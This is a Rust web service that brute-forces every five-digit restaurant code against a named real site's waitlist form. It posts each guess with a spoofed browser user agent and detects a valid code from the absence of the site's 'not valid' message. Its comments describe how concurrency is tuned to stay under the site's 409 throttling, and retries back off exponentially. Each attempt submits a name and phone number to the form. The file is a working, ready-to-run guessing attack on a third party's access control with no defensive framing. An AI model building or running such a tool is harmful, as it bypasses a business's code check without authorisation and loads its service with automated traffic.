//! Brute-forces 5-digit restaurant codes against checktodine.com's waitlist
//! endpoint.
//!   - 100,000 codes (00000..99999) by default; GET /start accepts
//!     ?from= and ?to= to scan a sub-range instead. The range is half-open:
//!     from is inclusive, to is exclusive, both within 00000..99999
//!     (to may be 100000 to include 99999).
//!   - 5 concurrent in-flight requests (the site 409s anything much higher)
//!   - 10 retries with exponential backoff per code
//!   - Body sniff for "Restaurant Code is not valid." → not valid; anything
//!     else means we found a hit
//!   - First success short-circuits the rest of the scan via an atomic flag
//!   - Single-flight: exactly one scan runs at a time (409 if busy)
//!   - GET /stop requests the running scan to stop
//!   - GET / serves the UI; GET /status returns JSON run status including
//!     per-attempt outcome counters for debugging

use axum::extract::{rejection::QueryRejection, Query, State};
use axum::http::StatusCode;
use axum::response::{Html, IntoResponse, Json};
use axum::routing::get;
use axum::Router;
use futures::stream::{self, StreamExt};
use reqwest::Client;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::net::SocketAddr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;

const TARGET_URL: &str = "https://checktodine.com/customer_waitlist.php?businessid=110";
const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36";
/// Kept low on purpose: the site answers 409 Conflict / drops connections
/// when it sees a burst of concurrent requests from one IP.
const MAX_CONCURRENT: usize = 5;
const INVALID_MARKER: &str = "Restaurant Code is not valid.";
/// Exclusive upper bound for `to`: 100000 means "up to and including 99999".
const MAX_TO: u32 = 100_000;

/// Query params for GET /start. Both optional; omit them to scan everything.
/// Half-open range: from is inclusive, to is exclusive.
/// Example: /start?from=12000&to=13000 scans 12000..=12999.
#[derive(Deserialize)]
struct StartParams {
    from: Option<u32>,
    to: Option<u32>,
}

#[derive(Clone)]
struct AppState {
    client: Client,
    /// Single-flight slot: true while a scan owns it.
    is_running: Arc<AtomicBool>,
    code_found: Arc<AtomicBool>,
    stop_requested: Arc<AtomicBool>,
    tried: Arc<AtomicU64>,
    total: Arc<AtomicU64>,
    trial_code: Arc<Mutex<String>>,
    valid_code: Arc<Mutex<String>>,
    scan_range: Arc<Mutex<String>>,
    // Per-run attempt outcome counters (debugging).
    ok_200: Arc<AtomicU64>,
    http_4xx: Arc<AtomicU64>,
    http_5xx: Arc<AtomicU64>,
    timeouts: Arc<AtomicU64>,
    net_errors: Arc<AtomicU64>,
    last_error: Arc<Mutex<String>>,
}

#[derive(Serialize)]
struct Status {
    running: bool,
    range: String,
    tried: u64,
    total: u64,
    trial_code: String,
    valid_code: String,
    found: bool,
    ok_200: u64,
    http_4xx: u64,
    http_5xx: u64,
    timeouts: u64,
    net_errors: u64,
    last_error: String,
}

/// Releases the single-flight slot when the scan task ends, even on panic.
struct RunGuard {
    is_running: Arc<AtomicBool>,
}

impl Drop for RunGuard {
    fn drop(&mut self) {
        self.is_running.store(false, Ordering::SeqCst);
    }
}

async fn set_last_error(state: &AppState, msg: &str) {
    let short: String = msg.chars().take(160).collect();
    *state.last_error.lock().await = short;
}

/// POST one code attempt. Returns true iff the response body does NOT
/// contain the invalid marker — meaning the code was accepted.
/// Every attempt outcome is counted for debugging via /status.
async fn submit(state: AppState, code: String) -> bool {
    if state.code_found.load(Ordering::Relaxed) || state.stop_requested.load(Ordering::Relaxed) {
        return false;
    }

    let form = [
        ("RestaurantCode", code.as_str()),
        ("WaitListName", "Hari"),
        ("WaitListPhone", "6504057400"),
        ("WaitListAdults", "1"),
        ("WaitListKids", ""),
        ("WaitListMessage", ""),
        ("SaveBooking", "  ＋ Add  "),
    ];

    let mut retries: u32 = 10;
    let mut wait_ms: u64 = 100;

    loop {
        if state.code_found.load(Ordering::Relaxed) || state.stop_requested.load(Ordering::Relaxed) {
            return false;
        }
        let res = state
            .client
            .post(TARGET_URL)
            .header("User-Agent", USER_AGENT)
            .form(&form)
            .send()
            .await;

        match res {
            Ok(resp) => {
                let status = resp.status();
                if status.is_success() {
                    state.ok_200.fetch_add(1, Ordering::Relaxed);
                    match resp.text().await {
                        Ok(body) => {
                            let success = !body.contains(INVALID_MARKER);
                            {
                                let mut tc = state.trial_code.lock().await;
                                *tc = code.clone();
                            }
                            if success {
                                let mut vc = state.valid_code.lock().await;
                                *vc = code.clone();
                                state.code_found.store(true, Ordering::Relaxed);
                                println!("Found valid code: {code}");
                            }
                            return success;
                        }
                        Err(e) => {
                            state.net_errors.fetch_add(1, Ordering::Relaxed);
                            set_last_error(&state, &format!("body read failed: {e}")).await;
                        }
                    }
                } else {
                    if status.is_client_error() {
                        state.http_4xx.fetch_add(1, Ordering::Relaxed);
                    } else if status.is_server_error() {
                        state.http_5xx.fetch_add(1, Ordering::Relaxed);
                    } else {
                        state.net_errors.fetch_add(1, Ordering::Relaxed);
                    }
                    set_last_error(&state, &format!("HTTP {status}")).await;
                }
            }
            Err(e) => {
                if e.is_timeout() {
                    state.timeouts.fetch_add(1, Ordering::Relaxed);
                } else {
                    state.net_errors.fetch_add(1, Ordering::Relaxed);
                }
                set_last_error(&state, &format!("request failed: {e}")).await;
            }
        }

        if retries == 0 {
            return false;
        }
        retries -= 1;
        tokio::time::sleep(Duration::from_millis(wait_ms)).await;
        wait_ms *= 2;
    }
}

/// Runs the scan. The caller must hold the single-flight slot: the RunGuard
/// created in start_handler is moved into the spawned task and releases the
/// slot when the task ends (even on panic).
async fn try_all(state: AppState, from: u32, to: u32) {
    let total = (to - from) as u64;
    println!("starting scan of {total} codes ({from:05}..<{to:05})");

    stream::iter(from..to)
        .map(|i| format!("{i:05}"))
        .for_each_concurrent(MAX_CONCURRENT, |code| {
            let st = state.clone();
            async move {
                let _ = submit(st.clone(), code).await;
                st.tried.fetch_add(1, Ordering::Relaxed);
            }
        })
        .await;

    let valid = state.valid_code.lock().await.clone();
    let found = state.code_found.load(Ordering::Relaxed);
    let tried = state.tried.load(Ordering::Relaxed);
    let stopped = state.stop_requested.load(Ordering::Relaxed);
    println!("scan finished. tried={tried}/{total} found={found} valid={valid} stopped={stopped}");
}

async fn status_handler(State(state): State<AppState>) -> Json<Status> {
    Json(Status {
        running: state.is_running.load(Ordering::SeqCst),
        range: state.scan_range.lock().await.clone(),
        tried: state.tried.load(Ordering::Relaxed),
        total: state.total.load(Ordering::Relaxed),
        trial_code: state.trial_code.lock().await.clone(),
        valid_code: state.valid_code.lock().await.clone(),
        found: state.code_found.load(Ordering::Relaxed),
        ok_200: state.ok_200.load(Ordering::Relaxed),
        http_4xx: state.http_4xx.load(Ordering::Relaxed),
        http_5xx: state.http_5xx.load(Ordering::Relaxed),
        timeouts: state.timeouts.load(Ordering::Relaxed),
        net_errors: state.net_errors.load(Ordering::Relaxed),
        last_error: state.last_error.lock().await.clone(),
    })
}

async fn reset_run_state(state: &AppState, from: u32, to: u32) {
    state.code_found.store(false, Ordering::Relaxed);
    state.stop_requested.store(false, Ordering::Relaxed);
    state.tried.store(0, Ordering::Relaxed);
    state.total.store((to - from) as u64, Ordering::Relaxed);
    state.ok_200.store(0, Ordering::Relaxed);
    state.http_4xx.store(0, Ordering::Relaxed);
    state.http_5xx.store(0, Ordering::Relaxed);
    state.timeouts.store(0, Ordering::Relaxed);
    state.net_errors.store(0, Ordering::Relaxed);
    *state.trial_code.lock().await = "—".to_string();
    *state.valid_code.lock().await = "—".to_string();
    *state.scan_range.lock().await = format!("{from:05}..{to:05}");
    *state.last_error.lock().await = "—".to_string();
}

async fn start_handler(
    State(state): State<AppState>,
    query: Result<Query<StartParams>, QueryRejection>,
) -> impl IntoResponse {
    // Map extractor-level rejections (e.g. ?from=abc) into our JSON error shape.
    let params = match query {
        Ok(Query(p)) => p,
        Err(e) => {
            return (
                StatusCode::BAD_REQUEST,
                Json(json!({"ok": false, "error": format!("bad query: {e}")})),
            )
        }
    };
    let from = params.from.unwrap_or(0);
    let to = params.to.unwrap_or(MAX_TO);
    if from >= to || to > MAX_TO {
        return (
            StatusCode::BAD_REQUEST,
            Json(json!({"ok": false, "error": "bad range: need 0 <= from < to <= 100000 (from inclusive, to exclusive)"})),
        );
    }
    // Atomic single-flight reservation: exactly one scan runs at a time.
    if state.is_running.swap(true, Ordering::SeqCst) {
        return (
            StatusCode::CONFLICT,
            Json(json!({"ok": false, "error": "a scan is already running"})),
        );
    }
    // Hold the guard from acquisition: if this handler future is dropped
    // before the scan task spawns (client disconnect), the slot is released.
    let guard = RunGuard {
        is_running: state.is_running.clone(),
    };
    // Fresh per-run state.
    reset_run_state(&state, from, to).await;

    tokio::spawn(async move {
        let _guard = guard;
        try_all(state, from, to).await;
    });
    (
        StatusCode::OK,
        Json(json!({"ok": true, "message": format!("started {from:05}..{to:05}")})),
    )
}

async fn stop_handler(State(state): State<AppState>) -> impl IntoResponse {
    if !state.is_running.load(Ordering::SeqCst) {
        return (
            StatusCode::OK,
            Json(json!({"ok": true, "message": "no scan running"})),
        );
    }
    state.stop_requested.store(true, Ordering::SeqCst);
    (
        StatusCode::OK,
        Json(json!({"ok": true, "message": "stop requested; the scan will drain shortly"})),
    )
}

async fn root_handler() -> Html<&'static str> {
    Html(include_str!("index.html"))
}

#[tokio::main]
async fn main() {
    let port: u16 = std::env::var("PORT")
        .ok()
        .and_then(|p| p.parse().ok())
        .unwrap_or(3000);

    // Match the prior Node.js setup as closely as possible:
    //   https.Agent({ keepAlive: true, maxSockets: 1000 })
    //
    // Specifically: force HTTP/1.1 so concurrent requests use distinct TCP
    // sockets (HTTP/2 would multiplex 50 logical requests over a single
    // socket and the upstream processes them ~sequentially). Pool a lot of
    // idle sockets so we never pay a fresh TLS handshake during the scan.
    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .http1_only()
        .pool_max_idle_per_host(1000)
        .pool_idle_timeout(Duration::from_secs(90))
        .tcp_keepalive(Duration::from_secs(60))
        .user_agent(USER_AGENT)
        .build()
        .expect("build reqwest client");

    let state = AppState {
        client,
        is_running: Arc::new(AtomicBool::new(false)),
        code_found: Arc::new(AtomicBool::new(false)),
        stop_requested: Arc::new(AtomicBool::new(false)),
        tried: Arc::new(AtomicU64::new(0)),
        total: Arc::new(AtomicU64::new(0)),
        trial_code: Arc::new(Mutex::new("—".to_string())),
        valid_code: Arc::new(Mutex::new("—".to_string())),
        scan_range: Arc::new(Mutex::new("—".to_string())),
        ok_200: Arc::new(AtomicU64::new(0)),
        http_4xx: Arc::new(AtomicU64::new(0)),
        http_5xx: Arc::new(AtomicU64::new(0)),
        timeouts: Arc::new(AtomicU64::new(0)),
        net_errors: Arc::new(AtomicU64::new(0)),
        last_error: Arc::new(Mutex::new("—".to_string())),
    };

    let app = Router::new()
        .route("/", get(root_handler))
        .route("/start", get(start_handler))
        .route("/stop", get(stop_handler))
        .route("/status", get(status_handler))
        .with_state(state);

    let addr = SocketAddr::from(([0, 0, 0, 0], port));
    println!("dosa-code-finder listening on {addr}");
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
